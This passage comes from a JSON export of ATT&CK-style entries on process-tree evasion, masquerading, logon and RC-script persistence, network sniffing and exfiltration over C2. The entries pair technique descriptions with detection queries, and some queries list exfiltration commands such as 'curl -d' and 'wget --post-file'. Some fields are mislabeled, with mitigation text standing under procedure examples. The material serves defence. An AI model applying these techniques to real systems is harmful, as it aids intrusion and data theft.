    "Description": "An adversary may attempt to evade process tree-based analysis by modifying executed malware's parent process ID (PPID). If endpoint protection software leverages the \"parent-child\" relationship for detection, breaking this relationship could result in the adversary’s behavior not being associated with previous process tree activity. On Unix-based systems breaking this process tree is common practice for administrators to execute software using scripts and programs.[1]On Linux systems, adversaries may execute a series ofNative APIcalls to alter malware's process tree. For example, adversaries can execute their payload without any arguments, call thefork()API call twice, then have the parent process exit. This creates a grandchild process with no parent process that is immediately adopted by theinitsystem process (PID 1), which successfully disconnects the execution of the adversary's payload from its previous process tree.Another example is using the \"daemon\" syscall to detach from the current parent process and run in the background.[2][3]",
    "Detects": [
      "Monitor for API calls such asfork()which can be abused to masquerade or manipulate process metadata.",
      "Monitor for the abnormal creation of background processes as well as processes executing from abnormal locations, such as/dev/shm."
    ],
    "Procedure Examples": [
      "After initial execution,BPFDoorforks itself and runs the fork with the--initflag, which allows it to execute secondary clean up operations. The parent process terminates leaving the forked process to be inherited by the legitimate process init.[2]"
    ]
  },
  "T1036.010": {
    "Name": "Masquerading:Masquerade Account Name",
    "Description": "Adversaries may match or approximate the names of legitimate accounts to make newly created ones appear benign. This will typically occur duringCreate Account, although accounts may also be renamed at a later date. This may also coincide withAccount Access Removalif the actor first deletes an account before re-creating one with the same name.[1]Often, adversaries will attempt to masquerade as service accounts, such as those associated with legitimate software, data backups, or container cluster management.[2][3]They may also give accounts generic, trustworthy names, such as \"admin\", \"help\", or \"root.\"[4]Sometimes adversaries may model account names off of those already existing in the system, as a follow-on behavior toAccount Discovery.Note that this is distinct fromImpersonation, which describes impersonating specific trusted individuals or organizations, rather than user or service account names.",
    "Detects": [
      "Monitor for newly constructed accounts with names that are unusually generic or identical to recently-deleted accounts."
    ],
    "Procedure Examples": [
      "During the2016 Ukraine Electric Power Attack,Sandworm Teamcreated two new accounts, \"admin\" and \"система\" (System).[5]",
      "APT3has been known to create or enable accounts, such assupport_388945a0.[6]",
      "Dragonflyhas created accounts disguised as legitimate backup and service accounts as well as an email administration account.[7]",
      "Flamecan create backdoor accounts with loginHelpAssistanton domain connected systems if appropriate rights are available.[8][9]",
      "Magic Houndhas created local accounts namedhelpandDefaultAccounton compromised machines.[10][11]",
      "ServHelperhas created a new user namedsupportaccount.[12]",
      "Storm-1811has created Microsoft Teams accounts that spoof IT support and helpdesk members for use in application and voice phishing.[13]"
    ]
  },
  "T1036.011": {
    "Name": "Masquerading:Overwrite Process Arguments",
    "Description": "Adversaries may modify a process's in-memory arguments to change its name in order to appear as a legitimate or benign process. On Linux, the operating system stores command-line arguments in the process’s stack and passes them to themain()function as theargvarray. The first element,argv[0], typically contains the process name or path - by default, the command used to actually start the process (e.g.,cat /etc/passwd). By default, the Linux/procfilesystem uses this value to represent the process name. The/proc/<PID>/cmdlinefile reflects the contents of this memory, and tools likepsuse it to display process information. Since arguments are stored in user-space memory at launch, this modification can be performed without elevated privileges.During runtime, adversaries can erase the memory used by all command-line arguments for a process, overwriting each argument string with null bytes. This removes evidence of how the process was originally launched. They can then write a spoofed string into the memory region previously occupied byargv[0]to mimic a benign command, such ascat resolv.conf. The new command-line string is reflected in/proc/<PID>/cmdlineand displayed by tools likeps.[1][2]",
    "Detects": [
      "Compare/proc/<PID>/comm(which reflects the process name),cmdline(which reflectsargv[0]), and the actual binary (/proc/<PID>/exe) to detect inconsistencies. Combine with the activity of clearingargv[1..n]early in execution."
    ],
    "Procedure Examples": [
      "BPFDooroverwrites theargv[0]value used by the Linux/procfilesystem to determine the command line and command name to display for each process.BPFDoorselects a name from 10 hardcoded names that resemble Linux system daemons, such as;/sbin/udevd -d,dbus-daemon --system,avahi-daemon: chroot helper,/sbin/auditd -n, and/usr/lib/systemd/systemd-journald.[1]"
    ]
  },
  "T1037": {
    "Name": "Boot or Logon Initialization Scripts",
    "Description": "Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence.[1][2]Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.An adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.",
    "Detects": [
      "Monitor for changes made in the Active Directory that may use scripts automatically executed at boot or logon initialization to establish persistence.",
      "Monitor executed commands and arguments that may consist of logon scripts for unusual access by abnormal users or at abnormal times.",
      "Monitor for newly constructed files that may use scripts automatically executed at boot or logon initialization to establish persistence.",
      "Monitor for changes made to files that are modified by unusual accounts outside of normal administration duties.",
      "Monitor for newly executed processes that may use scripts automatically executed at boot or logon initialization to establish persistence. Adversaries may schedule software to run whenever a user logs into the system; this is done to establish persistence and sometimes for lateral movement. This trigger is established through the registry keyHKEY_CURRENT_USER\\EnvironmentUserInitMprLogonScript. This signature looks edits to existing keys or creation of new keys in that path. Users purposefully adding benign scripts to this path will result in false positives; that case is rare, however. There are other ways of running a script at startup or login that are not covered in this signature. Note that this signature overlaps with the Windows Sysinternals Autoruns tool, which would also show changes to this registry path.Analytic 1 - Boot or Logon Initialization Scripts(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") AND CommandLine=\"regadd\\EnvironmentUserInitMprLogonScript\"",
      "Monitor for newly constructed windows registry keys that may use scripts automatically executed at boot or logon initialization to establish persistence."
    ],
    "Procedure Examples": [
      "APT29has hijacked legitimate application-specific startup scripts to enable malware to execute on system startup.[1]",
      "APT41used a hidden shell script in/etc/rc.d/init.dto leverage theADORE.XSECbackdoor andAdore-NGrootkit.[3]",
      "ArcaneDoorused malicious boot scripts to install theLine Runnerbackdoor on victim devices.[4]",
      "Rockehas installed an \"init.d\" startup script to maintain persistence.[2]",
      "Depending on the Linux distribution and when executing with root permissions,RotaJakiromay install persistence using a.conffile in the/etc/init/folder.[5]"
    ]
  },
  "T1037.001": {
    "Name": "Boot or Logon Initialization Scripts:Logon Script (Windows)",
    "Description": "Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system.[1]This is done via adding a path to a script to theHKCU\\Environment\\UserInitMprLogonScriptRegistry key.[2]Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.",
    "Detects": [
      "Monitor executed commands and arguments for logon scripts",
      "Monitor for newly constructed processes and/or command-lines that execute logon scriptsAnalytic 1 - Boot or Logon Initialization Scripts(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") AND CommandLine=\"regadd\\EnvironmentUserInitMprLogonScript\"",
      "Monitor for the creation to Registry keys associated with Windows logon scrips, nameleyHKCU\\Environment\\UserInitMprLogonScript.Adversaries may schedule software to run whenever a user logs into the system; this is done to establish persistence and sometimes for lateral movement. This trigger is established through the registry key HKEY_CURRENT_USER\\EnvironmentUserInitMprLogonScript. This signature looks edits to existing keys or creation of new keys in that path. Users purposefully adding benign scripts to this path will result in false positives; that case is rare, however. There are other ways of running a script at startup or login that are not covered in this signature. Note that this signature overlaps with the Windows Sysinternals Autoruns tool, which would also show changes to this registry path.Analytic 1 - Boot or Logon Initialization Scripts(sourcetype=WinEventLog:Microsoft-Windows-Sysmon/Operational EventCode IN (12, 14, 13)) TargetObject= \"\\EnvironmentUserInitMprLogonScript\")"
    ],
    "Procedure Examples": [
      "AnAPT28loader Trojan adds the Registry keyHKCU\\Environment\\UserInitMprLogonScriptto establish persistence.[3]",
      "Attor's dispatcher can establish persistence via adding a Registry key with a logon scriptHKEY_CURRENT_USER\\Environment \"UserInitMprLogonScript\".[4]",
      "Cobalt Grouphas added persistence by registering the file name for the next stage malware underHKCU\\Environment\\UserInitMprLogonScript.[5]",
      "JHUHUGIThas registered a Windows shell script under the Registry keyHKCU\\Environment\\UserInitMprLogonScriptto establish persistence.[6][7]",
      "KGH_SPYhas the ability to set theHKCU\\Environment\\UserInitMprLogonScriptRegistry key to execute logon scripts.[8]",
      "Zebrocyperforms persistence with a logon script via adding to the Registry keyHKCU\\Environment\\UserInitMprLogonScript.[9]"
    ]
  },
  "T1037.002": {
    "Name": "Boot or Logon Initialization Scripts:Login Hook",
    "Description": "Adversaries may use a Login Hook to establish persistence executed upon user logon. A login hook is a plist file that points to a specific script to execute with root privileges upon user logon. The plist file is located in the/Library/Preferences/com.apple.loginwindow.plistfile and can be modified using thedefaultscommand-line utility. This behavior is the same for logout hooks where a script can be executed upon user logout. All hooks require administrator permissions to modify or create hooks.[1][2]Adversaries can add or insert a path to a malicious script in thecom.apple.loginwindow.plistfile, using theLoginHookorLogoutHookkey-value pair. The malicious script is executed upon the next user login. If a login hook already exists, adversaries can add additional commands to an existing login hook. There can be only one login and logout hook on a system at a time.[3][4]Note:Login hooks were deprecated in 10.11 version of macOS in favor ofLaunch DaemonandLaunch Agent",
    "Detects": [
      "Monitor executed commands with arguments to install or modify login hooks.",
      "Monitor for the creation of and/or changes to login hook files (/Library/Preferences/com.apple.loginwindow.plist), especially by unusual accounts outside of normal administration duties.",
      "Monitor for changes to login hook files (/Library/Preferences/com.apple.loginwindow.plist), especially by unusual accounts outside of normal administration duties.",
      "Monitor for processes and/or command-lines to install or modify login hooks, as well as processes spawned at user login by these hooks."
    ],
    "Procedure Examples": [
      "Restrict write access to logon scripts to specific administrators."
    ]
  },
  "T1037.003": {
    "Name": "Boot or Logon Initialization Scripts:Network Logon Script",
    "Description": "Adversaries may use network logon scripts automatically executed at logon initialization to establish persistence. Network logon scripts can be assigned using Active Directory or Group Policy Objects.[1]These logon scripts run with the privileges of the user they are assigned to. Depending on the systems within the network, initializing one of these scripts could apply to more than one or potentially all systems.Adversaries may use these scripts to maintain persistence on a network. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.",
    "Detects": [
      "Monitor for changes made in the Active Directory that may use network logon scripts automatically executed at logon initialization to establish persistence.",
      "Monitor executed commands and arguments for logon scripts",
      "Monitor for newly constructed files by unusual accounts outside of normal administration duties",
      "Monitor for changes made to files for unexpected modifications to unusual accounts outside of normal administration duties",
      "Monitor for newly constructed processes and/or command-lines that execute logon scripts"
    ],
    "Procedure Examples": [
      "Restrict write access to logon scripts to specific administrators."
    ]
  },
  "T1037.004": {
    "Name": "Boot or Logon Initialization Scripts:RC Scripts",
    "Description": "Adversaries may establish persistence by modifying RC scripts, which are executed during a Unix-like system’s startup. These files allow system administrators to map and start custom services at startup for different run levels. RC scripts require root privileges to modify.Adversaries may establish persistence by adding a malicious binary path or shell commands torc.local,rc.common, and other RC scripts specific to the Unix-like distribution.[1][2]Upon reboot, the system executes the script's contents as root, resulting in persistence.Adversary abuse of RC scripts is especially effective for lightweight Unix-like distributions using the root user as default, such as ESXi hypervisors, IoT, or embedded systems.[3]As ESXi servers store most system files in memory and therefore discard changes on shutdown, leveraging/etc/rc.local.d/local.shis one of the few mechanisms for enabling persistence across reboots.[4]Several Unix-like systems have moved to Systemd and deprecated the use of RC scripts. This is now a deprecated mechanism in macOS in favor ofLaunchd.[5][6]This technique can be used on Mac OS X Panther v10.3 and earlier versions which still execute the RC scripts.[7]To maintain backwards compatibility some systems, such as Ubuntu, will execute the RC scripts if they exist with the correct file permissions.[8]",
    "Detects": [
      "Monitor executed commands and arguments resulting from RC scripts for unusual or unknown applications or behavior.",
      "Monitor for newly constructed/etc/rc.localfiles.",
      "Monitor for changes made to files for unexpected modifications to RC scripts in the/etc/directory. On ESXi servers, the/etc/rc.local.d/local.shfile should almost always be empty.[4]",
      "Monitor for newly constructed processes and/or command-lines that execute/etc/rc.localif present."
    ],
    "Procedure Examples": [
      "APT29has installed a run command on a compromised system to enable malware execution on system startup.[9]",
      "Cyclops Blinkhas the ability to execute on device startup, using a modified RC script named S51armled.[10]",
      "Green Lambertcan addinit.dandrc.dfiles in the/etcfolder to establish persistence.[11][12]",
      "HiddenWaspinstalls reboot persistence by adding itself to/etc/rc.local.[2]",
      "iKittenadds an entry to the rc.common file for persistence.[13]",
      "Velvet Antused a modified/etc/rc.localfile on compromised F5 BIG-IP devices to maintain persistence.[14]"
    ]
  },
  "T1037.005": {
    "Name": "Boot or Logon Initialization Scripts:Startup Items",
    "Description": "Adversaries may use startup items automatically executed at boot initialization to establish persistence. Startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items.[1]This is technically a deprecated technology (superseded byLaunch Daemon), and thus the appropriate folder,/Library/StartupItemsisn’t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist),StartupParameters.plist, reside in the top-level directory.An adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism.[2]Additionally, since StartupItems run during the bootup phase of macOS, they will run as the elevated root user.",
    "Detects": [
      "Monitor executed commands and arguments for logon scripts",
      "Monitor for newly constructed files by unusual accounts outside of normal administration duties",
      "Monitor for changes made to files for unexpected modifications to /Library/StartupItem folder",
      "Monitor for newly constructed processes and/or command-lines that execute during the boot up process to check for unusual or unknown applications and behavior"
    ],
    "Procedure Examples": [
      "jRATcan list and manage startup entries.[3]"
    ]
  },
  "T1039": {
    "Name": "Data from Network Shared Drive",
    "Description": "Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality withincmdmay be used to gather information.",
    "Detects": [
      "Monitor executed commands and arguments for actions that could be taken to collect files from a network share. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as Windows Management Instrumentation and PowerShell.",
      "Monitor for unexpected files (i.e. .pdf, .docx, .jpg, etc.)  interacting with network shares.",
      "Monitor for unexpected and abnormal accesses to network shares.",
      "Monitor for newly constructed network connections that may search network shares on computers they have compromised to find files of interest. Network Analysis frameworks such as Zeek can be used to capture, decode, and alert on network protocols such as SMB that revolve around network shares.",
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Network Analysis frameworks such as Zeek can be used to capture, decode, and alert on network protocols such as SMB that revolve around network shares. Although there may be more native ways to detect detailed SMB events on the host, they can be extracted out of network traffic. With the right protocol decoders, port 445 traffic can be filtered and even the file path (relative to the share) can be retrieved.Looking at this activity more closely to obtain an adequate sense of situational awareness may make it possible to detect adversaries moving between hosts in a way that deviates from normal activity. Because SMB traffic is heavy in many environments, this analytic may be difficult to turn into something that can be used to quickly detect an APT. In some cases, it may make more sense to run this analytic in a forensic fashion. Looking through and filtering its output after an intrusion has been discovered may be helpful in identifying the scope of compromise."
    ],
    "Procedure Examples": [
      "APT28has collected files from network shared drives.[1]",
      "When it first starts,BADNEWScrawls the victim's mapped drives and collects documents with the following extensions: .doc, .docx, .pdf, .ppt, .pptx, and .txt.[2]",
      "BRONZE BUTLERhas exfiltrated files stolen from file shares.[3]",
      "DuringC0015, the threat actors collected files from network shared drives prior to network encryption.[4]",
      "Chimerahas collected data of interest from network shares.[5]",
      "CosmicDukesteals user files from network shared drives with file extensions and keywords that match a predefined list.[6]",
      "Egregorcan collect any files found in the enumerated drivers before sending it to its C2 channel.[7]",
      "Fox Kittenhas searched network shares to access sensitive documents.[8]",
      "Gamaredon Groupmalware has collected Microsoft Office documents from mapped network drives.[9]",
      "menuPasshas collected data from remote systems by mounting network shares withnet useand using Robocopy to transfer data.[10]",
      "Ramsaycan collect data from network drives and stage it for exfiltration.[11]",
      "RedCurlhas collected data about network drives.[12][13]",
      "Sowbugextracted Word documents from a file server on a victim network.[14]"
    ]
  },
  "T1040": {
    "Name": "Network Sniffing",
    "Description": "Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.Data captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such asLLMNR/NBT-NS Poisoning and SMB Relay, can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.Network sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequentLateral Movementand/orDefense Evasionactivities. Adversaries may likely also utilize network sniffing duringAdversary-in-the-Middle(AiTM) to passively gain additional knowledge about the environment.In cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.[1][2][3]Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.[4][5]The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.[4]On network devices, adversaries may perform network captures usingNetwork Device CLIcommands such asmonitor capture.[6][7]",
    "Detects": [
      "Monitor executed commands and arguments for actions that aid in sniffing network traffic to capture information about an environment, including authentication material passed over the network.Analytic 1 - Unexpected command execution of network sniffing tools.index=security (sourcetype=\"Powershell\" EventCode=4104) | eval CommandLine=coalesce(Command_Line, CommandLine)| where ExecutingProcess IN (\"tshark.exe\", \"windump.exe\", \"tcpdump.exe\", \"wprui.exe\", \"*wpr.exe\")",
      "Monitor for newly executed processes that can aid in sniffing network traffic to capture information about an environment, including authentication material passed over the networkNote: The Analytic is for Windows systems and looks for new processes that have the names of the most common network sniffing tools. While this may be noisy on networks where sysadmins are using any of these tools on a regular basis, in most networks their use is noteworthy.Analytic 1 - Unexpected execution of network sniffing tools.index=security sourcetype=\"WinEventLog:Security\" EventCode=4688 OR index=security sourcetype=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=1 Image IN (\"tshark.exe\", \"windump.exe\", \"*tcpdump.exe\", \"wprui.exe\", \"wpr.exe\") AND ParentImage!=\"C:\\Program Files\\Windows Event Reporting\\Core\\EventReporting.AgentService.exe\""
    ],
    "Procedure Examples": [
      "During the2015 Ukraine Electric Power Attack,Sandworm TeamusedBlackEnergy’s network sniffer module to discover user credentials being sent over the network between the local LAN and the power grid’s industrial control systems.[8]",
      "APT28deployed the open source tool Responder to conduct NetBIOS Name Service poisoning, which captured usernames and hashed passwords that allowed access to legitimate credentials.[9][10]APT28close-access teams have used Wi-Fi pineapples to intercept Wi-Fi signals and user credentials.[11]",
      "APT33has used SniffPass to collect credentials by sniffing network traffic.[12]",
      "ArcaneDoorincluded network packet capture and sniffing for data collection in victim environments.[13][14]",
      "cd00rcan use the libpcap library to monitor captured packets for specifc sequences.[15]",
      "DarkVishnyaused network sniffing to obtain login data.[16]",
      "Emotethas been observed to hook network APIs to monitor network traffic.[17]",
      "Empirecan be used to conduct packet captures on target hosts.[18]",
      "FoggyWebcan configure custom listeners to passively monitor all incoming HTTP GET and POST requests sent to the AD FS server from the intranet/internet and intercept HTTP requests that match the custom URI patterns defined by the actor.[19]",
      "Impacketcan be used to sniff network traffic via an interface or raw socket.[20]",
      "J-magichas a pcap listener function that can create an Extended Berkley Packet Filter (eBPF) on designated interfaces and ports.[21]",
      "JumbledPathhas the ability to perform packet capture on remote devices via actor-defined jump-hosts.[22]",
      "Kimsukyhas used the Nirsoft SniffPass network sniffer to obtain passwords sent over non-secure protocols.[23][24]",
      "Line Dancercan create and exfiltrate packet captures from compromised environments.[13]",
      "MESSAGETAPuses the libpcap library to listen to all traffic and parses network protocols starting with Ethernet and IP layers. It continues parsing protocol layers including SCTP, SCCP, and TCAP and finally extracts SMS message data and routing metadata.[25]",
      "NBTscancan dump and print whole packet content.[26][27]",
      "Penquincan sniff network traffic to look for packets matching specific conditions.[28][29]",
      "PoshC2contains a module for taking packet captures on compromised hosts.[30]",
      "Reginappears to have functionality to sniff for credentials passed over HTTP, SMTP, and SMB.[31]",
      "Respondercaptures hashes and credentials that are sent to the system after the name services have been poisoned.[32]",
      "Salt Typhoonhas used a variety of tools and techniques to capture packet data between network interfaces.[22]",
      "Sandworm Teamhas used intercepter-NG to sniff passwords in network traffic.[33]",
      "Velvet Anthas used a custom tool, \"VELVETTAP\", to perform packet capture from compromised F5 BIG-IP devices.[34]",
      "VersaMemhooked the Catalina application filter chaindoFilteron compromised systems to monitor all inbound requests to the local Tomcat web server, inspecting them for parameters like passwords and follow-on Java modules.[35]"
    ]
  },
  "T1041": {
    "Name": "Exfiltration Over C2 Channel",
    "Description": "Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.",
    "Detects": [
      "Monitor executed commands and arguments that may steal data by exfiltrating it over an existing command and control channel.Analytic 1 - Detecting C2 Tool Execution Related to Exfiltration(EventCode=1 OR source=\"/var/log/audit/audit.log\" type=\"execve\")| where (command IN (\"powershell -enc\", \"python -c\", \"curl -d\", \"wget --post-file\", \"certutil -encode\", \"base64 -w 0\"))| eval risk_score=case(    command IN (\"powershell -enc\", \"certutil -encode\"), 9,    command IN (\"python -c\", \"curl -d\"), 8)| where risk_score >= 8| stats count by _time, host, user, command, risk_score",
      "Monitor for suspicious files (i.e. .pdf, .docx, .jpg, etc.) viewed in isolation that may steal data by exfiltrating it over an existing command and control channel.Analytic 1 - Detecting File Access Before C2 Exfiltration(EventCode=11 OR EventCode=4663 OR source=\"/var/log/audit/audit.log\" type=\"open\")| where (file_path IN (\"/tmp/\", \"/var/tmp/\", \"/home//Downloads/\", \"C:\\Users\\\\Documents\\exfil\"))| eval risk_score=case(    file_path IN (\"/tmp/\", \"/var/tmp/\"), 9,    file_path IN (\"/home//Downloads/*\"), 8)| where risk_score >= 8| stats count by _time, host, user, file_path, risk_score",
      "Monitor for newly constructed network connections that are sent or received by untrusted hosts.Note: Network Analysis frameworks such as Zeek can be used to capture, decode, and alert on TCP network connection creation.Analytic 1 - Detecting Outbound Network Connections for C2 Exfiltration(EventCode=3 OR source=\"zeek_conn.log\" OR source=\"firewall_logs\")| where (bytes_out > 1000000 AND bytes_out > bytes_in * 5) // High outbound traffic| bucket span=1h _time| stats count by _time, host, process, dest_ip, bytes_out| where count > 5| stats count by host, dest_ip, count, earliest(_time), latest(_time)| where count >= 5| eval risk_score=case(    count >= 10, 9,    count >= 5, 8)| where risk_score >= 8| table host, dest_ip, count, earliest, latest, risk_score",
      "Hidden or encoded data inside normal C2 traffic (e.g., Base64, XOR, custom encoding).HTTP/S payloads with unusual long strings in GET/POST requests.DNS tunneling techniques used to bypass security controls.Analytic 1 - Detecting Encoded or Hidden Data in C2 Channels(EventCode=3 OR source=\"zeek_http.log\" OR source=\"dns.log\")| where (uri_length > 200 OR request_body_length > 5000)| eval encoded_data=if(match(uri, \"([A-Za-z0-9+/=]{100,})\") OR match(request_body, \"([A-Za-z0-9+/=]{100,})\"), 1, 0)| where encoded_data=1| stats count by _time, host, user, uri, request_body_length, risk_score| eval risk_score=case(    request_body_length > 10000, 9,    request_body_length > 5000, 8)| where risk_score >= 8| table host, uri, request_body_length, risk_score",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
    ],
    "Procedure Examples": [
      "ADVSTORESHELLexfiltrates data over the same channel used for C2.[1]",
      "Agriusexfiltrated staged data using tools such as Putty and WinSCP, communicating with command and control servers.[2]",
      "Amadeyhas sent victim data to its C2 servers.[3]",
      "AppleJeushas exfiltrated collected host information to a C2 server.[4]",
      "AppleSeedcan exfiltrate files via the C2 channel.[5]",
      "APT3has a tool that exfiltrates data over the C2 channel.[6]",
      "APT32's backdoor has exfiltrated data using the already opened channel with its C&C server.[7]",
      "APT39has exfiltrated stolen victim data through C2 communications.[8]",
      "ArcaneDoorincluded use of existing command and control channels for data exfiltration.[9][10]",
      "Astarothexfiltrates collected information from its r1.log file to the external C2 server.[11]",
      "Attorhas exfiltrated data over the C2 channel.[12]",
      "AuTo Stealercan exfiltrate data over actor-controlled C2 servers via HTTP or TCP.[13]",
      "Adversaries can directBACKSPACEto upload files to the C2 Server.[14]",
      "BADHATCHcan exfiltrate data over the C2 channel.[15][16]",
      "Bandookcan upload files from a victim's machine over the C2 channel.[17]",
      "Bankshotexfiltrates data over its C2 channel.[18]",
      "Bisonalhas added the exfiltrated data to the URL over the C2 channel.[19]",
      "BlackBytetransmitted collected victim host information via HTTP POST to command and control infrastructure.[20]",
      "BLINDINGCANhas sent user and system information to a C2 server via HTTP POST requests.[21][22]",
      "BLUELIGHThas exfiltrated data over its C2 channel.[23]",
      "BoxCaonuploads files and data from a compromised host over the existing C2 channel.[24]",
      "Bumblebeecan send collected data in JSON format to C2.[25]",
      "DuringC0017,APT41used its Cloudflare services C2 channels for data exfiltration.[26]",
      "CallMeexfiltrates data to its C2 server over the same protocol as C2 communications.[27]",
      "Cannonexfiltrates collected data over email via SMTP/S and POP3/S C2 channels.[28]",
      "Carberphas exfiltrated data via HTTP to already established C2 servers.[29][30]",
      "Caterpillar WebShellcan upload files over the C2 channel.[31]",
      "CharmPowercan exfiltrate gathered data to a hardcoded C2 URL via HTTP POST.[32]",
      "Chimerahas usedCobalt StrikeC2 beacons for data exfiltration.[33]",
      "CHIMNEYSWEEPcan upload collected files to the command-and-control server.[34]",
      "Chrommmecan exfiltrate collected data via C2.[35]",
      "Confuciushas exfiltrated stolen files to its C2 server.[36]",
      "CreepySnailcan connect to C2 for data exfiltration.[37]",
      "Crimsoncan exfiltrate stolen information over its C2.[38]",
      "Crutchcan exfiltrate data over the primary C2 channel (Dropbox HTTP API).[39]",
      "Cuckoo Stealercan send information about the targeted system to C2 including captured passwords, OS build, hostname, and username.[40]",
      "CURIUMhas used IMAP and SMTPS for exfiltration via tools such asIMAPLoader.[41]",
      "Cyclops Blinkhas the ability to upload exfiltrated files to a C2 server.[42]",
      "DarkGateuses existing command and control channels to retrieve captured cryptocurrency wallet credentials.[43]",
      "DnsSystemcan exfiltrate collected data to its C2 server.[44]",
      "Dokihas used Ngrok to establish C2 and exfiltrate data.[45]",
      "Drovorubcan exfiltrate files over C2 infrastructure.[46]",
      "DUSTTRAPcan exfiltrate collected data over C2 channels.[47]",
      "DustySkyhas exfiltrated data to the C2 server.[48]",
      "Dyrehas the ability to send information staged on a compromised host externally to C2.[49]",
      "Eburyexfiltrates a list of outbound and inbound SSH sessions using OpenSSH'sknown_hostfiles andwtmprecords.Eburycan exfiltrate SSH credentials through custom DNS queries or use the commandXcatto send the process's ssh session's credentials to the C2 server.[50][51]",
      "Emotethas exfiltrated data over its C2 channel.[52][53]",
      "Empirecan send data gathered from a target through the command and control channel.[54][55]",
      "EVILNUMcan upload files over the C2 channel from the infected host.[56]",
      "Flagprohas exfiltrated data to the C2 server.[57]",
      "FlawedAmmyyhas sent data collected from a compromised host to its C2 servers.[58]",
      "FoggyWebcan remotely exfiltrate sensitive information from a compromised AD FS server.[59]",
      "DuringFrankenstein, the threat actors collected information viaEmpire, which sent the data back to the adversary's C2.[55]",
      "FunnyDreamcan execute commands, including gathering user information, and send the results to C2.[60]",
      "GALLIUMused Web shells andHTRANfor C2 and to exfiltrate data.[61]",
      "AGamaredon Groupfile stealer can transfer collected files to a hardcoded C2 server.[62]",
      "GoldenSpyhas exfiltrated host environment information to an external C2 domain via port 9006.[63]",
      "GoldMaxcan exfiltrate files over the existing C2 channel.[64][65]",
      "Goopyhas the ability to exfiltrate data over the Microsoft Outlook C2 channel.[66]",
      "Grandoreirocan send data it retrieves to the C2 server.[67]",
      "GrimAgenthas sent data related to a compromise host over its C2 channel.[68]",
      "HAWKBALLhas sent system information and files over the C2 channel.[69]",
      "Higaisaexfiltrated data over its C2 channel.[70]",
      "DuringHomeLand Justice, threat actors used HTTP to transfer data from compromised Exchange servers.[71]",
      "HOPLIGHThas used its C2 channel to exfiltrate data.[72]",
      "HotCroissanthas the ability to download files from the infected host to the command and control (C2) server.[73]",
      "IceApple's Multi File Exfiltrator module can exfiltrate multiple files from a compromised host as an HTTP response over C2.[74]",
      "Imminent Monitorhas uploaded a file containing debugger logs, network information and system information to the C2.[75]",
      "Industroyersends information about hardware profiles and previously-received commands back to the C2 server in a POST-request.[76]",
      "IPsec Helperexfiltrates specific files through its command and control framework.[77]",
      "Ke3changtransferred compressed and encrypted RAR files containing exfiltration through the established backdoor command and control channel during operations.[78]",
      "Kesselhas exfiltrated information gathered from the infected system to the C2 server.[79]",
      "Kevincan send data from the victim host through a DNS C2 channel.[80]",
      "KGH_SPYcan exfiltrate collected information from the host to the C2 server.[81]",
      "Kimsukyhas exfiltrated data over its C2 channel.[82][83]",
      "KONNIhas sent data and files to its C2 server.[84][85][86]",
      "KOPILUWAKhas exfiltrated collected data to its C2 via POST requests.[87]",
      "Latrodectuscan exfiltrate encrypted system information to the C2 server.[88][89]",
      "Lazarus Grouphas exfiltrated data and files over a C2 channel through its various tools and malware.[90][91][92]",
      "Leviathanhas exfiltrated data over its C2 channel.[93]",
      "Leviathanexfiltrated collected data over existing command and control channels duringLeviathan Australian Intrusions.[94]",
      "LightNeuronexfiltrates data over its email C2 channel.[95]",
      "To exfiltrate data,LightSpyconfigures each module to send an obfuscated JSON blob to hardcoded URL endpoints or paths aligned to the module name.[96]",
      "Line Dancerexfiltrates collected data via command and control channels.[9]",
      "Line Runnerutilizes HTTP to retrieve and exfiltrate information staged usingLine Dancer.[9]",
